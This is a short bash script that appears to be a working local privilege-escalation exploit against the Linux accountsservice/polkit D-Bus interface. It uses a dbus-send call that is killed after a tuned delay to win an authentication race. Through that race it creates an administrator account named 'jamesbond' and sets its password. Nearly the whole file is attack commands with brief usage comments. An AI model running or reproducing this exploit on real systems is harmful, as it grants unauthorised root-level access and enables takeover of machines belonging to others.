#!/bin/bash

#Change the value of the delay time variable 'TIME' accordingly if necessary
#The value should be about half of the real time result from 'check_execution_time.sh'
TIME="0.015s"

#Create user 'jamesbond'
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:jamesbond string:"International Spy" int32:1 & sleep $TIME ; kill $!

#Check whether user 'jamesbond' has been created
id jamesbond

#Create hashed password for user 'jamesbond' and stores in variable 'PWD'
PWD=$(openssl passwd -5 double0seven)

#Set the password for user 'jamesbond' using variable 'PWD'
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:$PWD string:hackz & sleep $TIME ; kill $!

